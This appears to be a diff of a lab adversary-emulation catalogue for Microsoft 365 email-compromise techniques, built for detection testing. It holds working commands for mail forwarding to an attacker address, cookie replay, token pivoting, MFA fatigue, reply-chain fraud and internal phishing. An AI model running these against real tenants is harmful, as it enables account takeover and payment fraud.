+          "default": ""
+        },
+        {
+          "name": "forwarding_address",
+          "description": "External email address to forward matching mail to.",
+          "type": "String",
+          "default": "lab-attacker@example.com"
+        },
+        {
+          "name": "rule_name",
+          "description": "Display name for the inbox rule.",
+          "type": "String",
+          "default": "Tacklebox-Lab-Rule"
+        },
+        {
+          "name": "subject_filter",
+          "description": "Subject keyword that triggers the rule.",
+          "type": "String",
+          "default": "invoice"
+        },
+        {
+          "name": "token_cache_path",
+          "description": "Path to a Graph-scoped token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Post-Exploitation",
+      "authProfile": "graph-delegated",
+      "defenseEvasion": "Server-side rule persists beyond session; targeted exfiltration evades bulk-forwarding alerts",
+      "telemetrySources": [
+        "ual",
+        "graph_audit"
+      ],
+      "mappedKits": [
+        "Storm 1167",
+        "Tycoon"
+      ],
+      "chokepointId": "DC-POSTEX-002",
+      "chokepointUrl": "https://detectionchokepoints.com/postex/email-rules-exfil",
+      "references": [
+        "https://www.proofpoint.com/us/blog/threat-insight/bec-and-supply-chain-compromise"
+      ],
+      "hasCleanup": true,
+      "fidelity": "strong",
+      "featured": false
+    },
+    {
+      "slug": "T1213.002-sharepoint-search",
+      "technique": "T1213.002",
+      "displayName": "Post-Exploitation – SharePoint / OneDrive Content Search",
+      "testName": "Search SharePoint and OneDrive for sensitive content via Graph",
+      "description": "Searches SharePoint sites and OneDrive for files matching keyword patterns (e.g., \"password\", \"invoice\", \"wire transfer\") using the Microsoft Graph search API. Mimics BEC actors performing targeted intelligence collection before crafting fraud emails. Wraps Microsoft.Graph.Search.",
+      "executor": "powershell",
+      "executorCommand": "Import-Module Microsoft.Graph.Search -ErrorAction Stop\n\n$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)\nConnect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome\n\n$searchBody = @{\n    requests = @(\n        @{\n            entityTypes = @('driveItem', 'listItem')\n            query       = @{ queryString = '#{search_query}' }\n            from        = 0\n            size        = #{result_limit}\n        }\n    )\n}\n\n$searchResults = Invoke-MgQuerySearch -BodyParameter $searchBody\n\n$hits = @($searchResults.HitsContainers | ForEach-Object { $_.Hits })\nWrite-Host \"Found $($hits.Count) result(s) for query '#{search_query}'.\"\n\n$hits | Select-Object -Property @{N='Name';E={$_.Resource.Name}},\n                                 @{N='WebUrl';E={$_.Resource.WebUrl}},\n                                 @{N='Score';E={$_.Rank}} |\n    ConvertTo-Json | Set-Content -LiteralPath '#{output_path}'",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{output_path}') {\n    Remove-Item -LiteralPath '#{output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "search_query",
+          "description": "Search keyword(s) to look for in SharePoint/OneDrive.",
+          "type": "String",
+          "default": "password OR credentials OR invoice"
+        },
+        {
+          "name": "result_limit",
+          "description": "Maximum number of search results to retrieve.",
+          "type": "Integer",
+          "default": "20"
+        },
+        {
+          "name": "output_path",
+          "description": "Path to write search results as JSON.",
+          "type": "Path",
+          "default": "tacklebox-sp-search.json"
+        },
+        {
+          "name": "token_cache_path",
+          "description": "Path to a Graph-scoped token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Post-Exploitation",
+      "authProfile": "graph-delegated",
+      "defenseEvasion": "Search API access is rarely monitored; content access does not generate MailItemsAccessed",
+      "telemetrySources": [
+        "ual"
+      ],
+      "mappedKits": [],
+      "chokepointId": "DC-POSTEX-006",
+      "chokepointUrl": "https://detectionchokepoints.com/postex/sharepoint-search",
+      "references": [
+        "https://thedfirreport.com/2023/01/09/you-ve-been-hit-with-a-bec/"
+      ],
+      "hasCleanup": true,
+      "fidelity": "strong",
+      "featured": false
+    },
+    {
+      "slug": "T1528-oauth-consent-grant",
+      "technique": "T1528",
+      "displayName": "AiTM – OAuth Consent Grant Abuse",
+      "testName": "OAuth app consent grant via roadtx",
+      "description": "Tricks a victim into granting an attacker-controlled OAuth application access to their data. After consent, the attacker exchanges the auth code for tokens without requiring the victim's credentials again. Wraps roadtx to simulate the authorization code flow.",
+      "executor": "powershell",
+      "executorCommand": "roadtx interactiveauth `\n  --client '#{client_id}' `\n  --tenant '#{tenant_id}' `\n  --redirect-url '#{redirect_uri}' `\n  --scope '#{scope}' `\n  --tokenfile '#{token_output_path}'",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{token_output_path}') {\n    Remove-Item -LiteralPath '#{token_output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "client_id",
+          "description": "Attacker-controlled OAuth application client ID.",
+          "type": "String",
+          "default": "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+        },
+        {
+          "name": "redirect_uri",
+          "description": "Redirect URI registered on the attacker app.",
+          "type": "Url",
+          "default": "http://localhost:12345"
+        },
+        {
+          "name": "scope",
+          "description": "Requested OAuth scopes (space-separated).",
+          "type": "String",
+          "default": "openid profile offline_access Mail.Read"
+        },
+        {
+          "name": "token_output_path",
+          "description": "Path to write the resulting token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "AiTM",
+      "authProfile": "oauth-consent",
+      "defenseEvasion": "Consent phishing; attacker app accumulates delegated permissions",
+      "telemetrySources": [
+        "graph_audit",
+        "entra_signin"
+      ],
+      "mappedKits": [],
+      "chokepointId": "DC-AUTH-003",
+      "chokepointUrl": "https://detectionchokepoints.com/auth/oauth-consent-grant",
+      "references": [
+        "https://posts.specterops.io/hunting-azure-admins-for-vertical-escalation-3f0c2f430e1e"
+      ],
+      "hasCleanup": true,
+      "fidelity": "strong",
+      "featured": false
+    },
+    {
+      "slug": "T1534-bec-reply-chain",
+      "technique": "T1534",
+      "displayName": "Post-Exploitation – BEC Reply-Chain Hijacking",
+      "testName": "Reply to existing email thread from compromised mailbox via Graph",
+      "description": "Inserts a fraudulent reply into an existing email thread from the compromised victim's account. Reply-chain hijacking is more convincing than cold phishing because the recipient sees prior legitimate context. Wraps Microsoft.Graph.Mail to reply to the most recent thread found matching a subject keyword.",
+      "executor": "powershell",
+      "executorCommand": "Import-Module Microsoft.Graph.Mail -ErrorAction Stop\n\n$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)\nConnect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome\n\n$threads = Get-MgUserMessage `\n    -UserId '#{sender_user_id}' `\n    -Filter \"contains(subject,'#{thread_subject_keyword}')\" `\n    -Top 5 `\n    -Select 'id,subject,conversationId,toRecipients'\n\nif (-not $threads) {\n    throw \"No thread found matching subject keyword '#{thread_subject_keyword}'.\"\n}\n\n$targetMsg = $threads | Sort-Object ReceivedDateTime | Select-Object -Last 1\n\n$replyBody = @{\n    message = @{\n        body = @{\n            contentType = 'Text'\n            content     = '#{fraudulent_reply}'\n        }\n    }\n    comment = '#{fraudulent_reply}'\n}\n\nInvoke-MgReplyUserMessage -UserId '#{sender_user_id}' -MessageId $targetMsg.Id -BodyParameter $replyBody\nWrite-Host \"Reply-chain hijack sent in thread '$($targetMsg.Subject)'.\"",
+      "elevationRequired": false,
+      "cleanupCommand": "Write-Host \"No automated cleanup for sent email. Review Sent Items and delete manually.\"",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "sender_user_id",
+          "description": "User ID or UPN of the compromised sender.",
+          "type": "String",
+          "default": ""
+        },
+        {
+          "name": "thread_subject_keyword",
+          "description": "Keyword to search for in existing threads (reply to the most recent match).",
+          "type": "String",
+          "default": "payment"
+        },
+        {
+          "name": "fraudulent_reply",
+          "description": "Body text of the fraudulent reply.",
+          "type": "String",
+          "default": "Please update the wire transfer details to the account below before processing."
+        },
+        {
+          "name": "token_cache_path",
+          "description": "Path to a Graph-scoped token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Post-Exploitation",
+      "authProfile": "graph-delegated",
+      "defenseEvasion": "Legitimate thread context makes fraudulent reply highly convincing; no new thread created",
+      "telemetrySources": [
+        "ual"
+      ],
+      "mappedKits": [],
+      "chokepointId": "DC-POSTEX-008",
+      "chokepointUrl": "https://detectionchokepoints.com/postex/bec-reply-chain",
+      "references": [
+        "https://thedfirreport.com/2022/09/12/dead-end-job-bec-using-qbot/"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": false
+    },
+    {
+      "slug": "T1539-cookie-replay",
+      "technique": "T1539",
+      "displayName": "AiTM – Steal Session Cookie via Reverse Proxy (EvilGinx-style)",
+      "testName": "Cookie replay via roadtx",
+      "description": "Replays a stolen session cookie to authenticate without credentials or MFA. Wraps roadtx to inject the captured cookie and mint a new access token. This is the core post-phishing step in AiTM kits (Tycoon, Mamba, EvilProxy).",
+      "executor": "powershell",
+      "executorCommand": "roadtx getcookies `\n  --cookie '#{session_cookie}' `\n  --tenant '#{tenant_id}' `\n  --resource '#{resource}' `\n  --tokenfile '#{token_output_path}'",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{token_output_path}') {\n    Remove-Item -LiteralPath '#{token_output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "session_cookie",
+          "description": "Captured session cookie value (ESTSAUTH or ESTSAUTHPERSISTENT).",
+          "type": "String",
+          "default": "PLACEHOLDER_STOLEN_COOKIE"
+        },
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "resource",
+          "description": "Target resource URI for the replayed session.",
+          "type": "String",
+          "default": "https://graph.microsoft.com"
+        },
+        {
+          "name": "token_output_path",
+          "description": "Path to write the resulting token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "AiTM",
+      "authProfile": "cookie-replay",
+      "defenseEvasion": "MFA bypass via replayed session cookie; no credentials presented",
+      "telemetrySources": [
+        "entra_signin",
+        "ual"
+      ],
+      "mappedKits": [
+        "Eviltokens",
+        "Lapsed Domain Aitm",
+        "Mamba",
+        "Sneaky",
+        "Storm 1167",
+        "Tycoon"
+      ],
+      "chokepointId": "DC-AUTH-002",
+      "chokepointUrl": "https://detectionchokepoints.com/auth/cookie-replay",
+      "references": [
+        "https://aadinternals.com/post/aitm/",
+        "https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": false
+    },
+    {
+      "slug": "T1539-residential-proxy-replay",
+      "technique": "T1539",
+      "displayName": "Defense Evasion – Residential Proxy Cookie Replay",
+      "testName": "Cookie replay via residential proxy egress",
+      "description": "Replays a stolen session cookie through a residential proxy to make the sign-in appear to originate from a residential IP address, evading datacenter/hosting-IP detections. This is a custom primitive (allowed gap #3): wraps roadtx for cookie replay while routing egress through a configured residential proxy. The proxy_url input points to a lab SOCKS5/HTTP proxy simulating residential egress.",
+      "executor": "powershell",
+      "executorCommand": "$env:HTTPS_PROXY = '#{proxy_url}'\n$env:HTTP_PROXY  = '#{proxy_url}'\ntry {\n    roadtx getcookies `\n      --cookie '#{session_cookie}' `\n      --tenant '#{tenant_id}' `\n      --resource '#{resource}' `\n      --tokenfile '#{token_output_path}'\n} finally {\n    $env:HTTPS_PROXY = $null\n    $env:HTTP_PROXY  = $null\n}",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{token_output_path}') {\n    Remove-Item -LiteralPath '#{token_output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "session_cookie",
+          "description": "Captured session cookie (ESTSAUTH or ESTSAUTHPERSISTENT).",
+          "type": "String",
+          "default": "PLACEHOLDER_STOLEN_COOKIE"
+        },
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "resource",
+          "description": "Target resource URI.",
+          "type": "String",
+          "default": "https://graph.microsoft.com"
+        },
+        {
+          "name": "proxy_url",
+          "description": "Lab proxy URL for residential egress simulation (e.g., socks5://127.0.0.1:1080).",
+          "type": "Url",
+          "default": "socks5://127.0.0.1:1080"
+        },
+        {
+          "name": "token_output_path",
+          "description": "Path to write the resulting token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Defense Evasion",
+      "authProfile": "residential-proxy-replay",
+      "defenseEvasion": "Residential IP egress masks cookie replay as legitimate geography",
+      "telemetrySources": [
+        "entra_signin"
+      ],
+      "mappedKits": [
+        "Eviltokens",
+        "Lapsed Domain Aitm",
+        "Mamba",
+        "Sneaky",
+        "Storm 1167",
+        "Tycoon"
+      ],
+      "chokepointId": "DC-EVAS-006",
+      "chokepointUrl": "https://detectionchokepoints.com/evasion/residential-proxy-replay",
+      "references": [
+        "https://thedfirreport.com/2023/01/09/you-ve-been-hit-with-a-bec/"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": false
+    },
+    {
+      "slug": "T1550.001-token-refresh-swap",
+      "technique": "T1550.001",
+      "displayName": "Defense Evasion – Refresh Token Swap (Resource Pivoting)",
+      "testName": "Refresh token pivot to new resource via roadtx",
+      "description": "Takes a refresh token from a prior authentication (e.g., device-code phish) and exchanges it for an access token to a different resource without re-authentication. This pivots from one cloud resource to another using a single stolen refresh token. Wraps roadtx refreshtokens.",
+      "executor": "powershell",
+      "executorCommand": "roadtx refreshtokens `\n  --tokenfile '#{token_input_path}' `\n  --tenant '#{tenant_id}' `\n  --resource '#{target_resource}' `\n  --outfile '#{token_output_path}'",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{token_output_path}') {\n    Remove-Item -LiteralPath '#{token_output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "token_input_path",
+          "description": "Path to existing roadtools token cache (from a prior atomic).",
+          "type": "Path",
+          "default": ""
+        },
+        {
+          "name": "target_resource",
+          "description": "Resource URI to pivot to.",
+          "type": "String",
+          "default": "https://outlook.office.com"
+        },
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "token_output_path",
+          "description": "Path to write the new token for the target resource.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Defense Evasion",
+      "authProfile": "refresh-token-swap",
+      "defenseEvasion": "Resource pivoting via refresh token; no additional MFA or credentials",
+      "telemetrySources": [
+        "entra_signin"
+      ],
+      "mappedKits": [
+        "Eviltokens",
+        "Storm 1167",
+        "Tycoon"
+      ],
+      "chokepointId": "DC-EVAS-001",
+      "chokepointUrl": "https://detectionchokepoints.com/evasion/refresh-token-pivot",
+      "references": [
+        "https://dirkjanm.io/abusing-azure-ad-sso-with-the-on-behalf-of-flow/"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": false
+    },
+    {
+      "slug": "T1566.002-internal-phishing",
+      "technique": "T1566.002",
+      "displayName": "Post-Exploitation – Internal Spearphishing via Compromised Mailbox",
+      "testName": "Send internal phishing email via Graph from compromised account",
+      "description": "Sends a spearphishing email from the compromised victim's mailbox to an internal target, using a Graph API delegated send. Because the email originates from a legitimate internal address, it bypasses many external email gateway controls. This atomic targets a lab counterparty mailbox. Wraps Microsoft.Graph.Mail.",
+      "executor": "powershell",
+      "executorCommand": "Import-Module Microsoft.Graph.Mail -ErrorAction Stop\n\n$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)\nConnect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome\n\n$message = @{\n    subject      = '#{email_subject}'\n    body         = @{ contentType = 'Text'; content = '#{email_body}' }\n    toRecipients = @(\n        @{ emailAddress = @{ address = '#{recipient_address}' } }\n    )\n}\n\nSend-MgUserMail -UserId '#{sender_user_id}' -Message $message -SaveToSentItems:$false\nWrite-Host \"Internal phishing email sent from '#{sender_user_id}' to '#{recipient_address}'.\"",
+      "elevationRequired": false,
+      "cleanupCommand": "Write-Host \"No automated cleanup for sent email. Delete manually from Sent Items if needed.\"",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "sender_user_id",
+          "description": "User ID or UPN of the compromised sender mailbox.",
+          "type": "String",
+          "default": ""
+        },
+        {
+          "name": "recipient_address",
+          "description": "Internal recipient UPN for the phishing email.",
+          "type": "String",
+          "default": "lab-counterparty@labdomain.onmicrosoft.com"
+        },
+        {
+          "name": "email_subject",
+          "description": "Email subject line.",
+          "type": "String",
+          "default": "Urgent: Invoice Payment Confirmation Required"
+        },
+        {
+          "name": "email_body",
+          "description": "Email body text.",
+          "type": "String",
+          "default": "Please review and approve the attached invoice at your earliest convenience."
+        },
+        {
+          "name": "token_cache_path",
+          "description": "Path to a Graph-scoped token cache file.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "Post-Exploitation",
+      "authProfile": "graph-delegated",
+      "defenseEvasion": "Trusted internal sender bypasses external email gateways; SaveToSentItems=false reduces forensic artifacts",
+      "telemetrySources": [
+        "ual"
+      ],
+      "mappedKits": [
+        "Storm 2372"
+      ],
+      "chokepointId": "DC-POSTEX-007",
+      "chokepointUrl": "https://detectionchokepoints.com/postex/internal-phishing",
+      "references": [
+        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-093a"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": false
+    },
+    {
+      "slug": "T1621-mfa-fatigue",
+      "technique": "T1621",
+      "displayName": "AiTM – MFA Push Fatigue (Repeated Authentication Requests)",
+      "testName": "MFA push spam via roadtx",
+      "description": "Repeatedly attempts password-based authentication to trigger MFA push notifications, exhausting the victim until they approve. Wraps roadtx ROPC flow in a loop. In a lab this runs against a test account with a known password and MFA registered; the push is approved by the lab counterparty.",
+      "executor": "powershell",
+      "executorCommand": "$attempts = #{push_attempts}\n$success  = $false\nfor ($i = 1; $i -le $attempts; $i++) {\n    Write-Host \"MFA push attempt $i of $attempts...\"\n    $result = roadtx auth `\n        --username '#{username}' `\n        --password '#{password}' `\n        --client '#{client_id}' `\n        --tenant '#{tenant_id}' `\n        --tokenfile '#{token_output_path}' 2>&1\n    if ($LASTEXITCODE -eq 0) { $success = $true; break }\n    Start-Sleep -Seconds 5\n}\nif (-not $success) {\n    Write-Warning \"MFA push fatigue: victim did not approve after $attempts attempts.\"\n}",
+      "elevationRequired": false,
+      "cleanupCommand": "if (Test-Path -LiteralPath '#{token_output_path}') {\n    Remove-Item -LiteralPath '#{token_output_path}' -Force\n}",
+      "inputArguments": [
+        {
+          "name": "tenant_id",
+          "description": "Entra tenant ID of the lab tenant.",
+          "type": "String",
+          "default": "00000000-0000-0000-0000-000000000000"
+        },
+        {
+          "name": "username",
+          "description": "Lab target UPN (must have MFA registered).",
+          "type": "String",
+          "default": ""
+        },
+        {
+          "name": "password",
+          "description": "Lab account password.",
+          "type": "String",
+          "default": ""
+        },
+        {
+          "name": "client_id",
+          "description": "OAuth client ID supporting ROPC.",
+          "type": "String",
+          "default": "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+        },
+        {
+          "name": "push_attempts",
+          "description": "Number of MFA push attempts before stopping.",
+          "type": "Integer",
+          "default": "3"
+        },
+        {
+          "name": "token_output_path",
+          "description": "Path to write the token cache if authentication succeeds.",
+          "type": "Path",
+          "default": "#{token_cache_path}"
+        }
+      ],
+      "supportedPlatforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "phase": "AiTM",
+      "authProfile": "mfa-fatigue",
+      "defenseEvasion": "MFA bypass via push notification exhaustion; no AiTM proxy required",
+      "telemetrySources": [
+        "entra_signin"
+      ],
+      "mappedKits": [],
+      "chokepointId": "DC-MFA-001",
+      "chokepointUrl": "https://detectionchokepoints.com/mfa/push-fatigue",
+      "references": [
+        "https://www.microsoft.com/en-us/security/blog/2022/10/26/microsoft-entra-expands-security-protections/"
+      ],
+      "hasCleanup": true,
+      "fidelity": "partial",
+      "featured": false
+    }
+  ],
+  "kits": [
+    {
+      "slug": "eviltokens",
+      "name": "Eviltokens",
+      "observation": true,
+      "fingerprints": 0,
+      "chokepoints": true,
+      "rig": true,
+      "atomics": 4
+    },
+    {
+      "slug": "lapsed-domain-aitm",
+      "name": "Lapsed Domain Aitm",
+      "observation": true,
+      "fingerprints": 0,
+      "chokepoints": true,
+      "rig": true,
+      "atomics": 1
+    },
+    {
+      "slug": "mamba",
+      "name": "Mamba",
+      "observation": true,
+      "fingerprints": 0,
+      "chokepoints": true,
+      "rig": true,
+      "atomics": 2
+    },
+    {
+      "slug": "sneaky",
+      "name": "Sneaky",
+      "observation": true,
+      "fingerprints": 0,
+      "chokepoints": true,
+      "rig": true,
+      "atomics": 2
+    },
+    {
+      "slug": "storm-1167",
+      "name": "Storm 1167",
+      "observation": true,
+      "fingerprints": 0,
+      "chokepoints": true,
+      "rig": true,
+      "atomics": 3
+    },
+    {
+      "slug": "storm-2372",
+      "name": "Storm 2372",
+      "observation": true,
+      "fingerprints": 0,
+      "chokepoints": true,
+      "rig": true,
+      "atomics": 5
+    },
+    {
+      "slug": "tycoon",
+      "name": "Tycoon",
+      "observation": true,
+      "fingerprints": 0,
+      "chokepoints": true,
+      "rig": true,
+      "atomics": 6
+    }
+  ],
+  "evidenceClaims": [
+    {
+      "schema_version": "TackleboxPublicClaim/v1",
+      "claim_id": "tpc_668dea409daab2e5623440879050b981",
+      "producer": "tacklebox",
+      "upstream_evidence_ref": {
+        "schema_version": "TackleboxEvidenceReference/v1",
+        "provider": "intelopes",
+        "ref_id": "intelopes:tacklebox-evidence:956efd131c9d5ade11b5b6ae"
+      },
+      "kit_id": "tycoon-2fa",
+      "behavior_id": "server-side-relay-client-context",
+      "role": "relay",
+      "direction": "kit_to_identity",
+      "chokepoint_ref": "detection-chokepoints/aitm-websocket-relay",
+      "detection_tier": "Hunt",
+      "evidence_class": "synthetic_fixture",
+      "confidence": "high",
+      "time_basis": "observed",
+      "observed_date": "2026-08-30",
+      "source_published_date": null,
+      "review_state": "approved",
+      "caveat": "Synthetic compatibility fixture; it does not identify active infrastructure or prove a lab observation.",
+      "provenance": {
+        "source_url": null,
+        "source_sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      },
+      "judgment": {
+        "schema_version": "JudgmentRef/v1",
+        "subject_revision_sha256": "46ab92cc250f54dadc631c195406b8dcf0277ed84988213bf453cd8b181957b0",
+        "verdict": "pass"
+      }
+    }
+  ]
+}
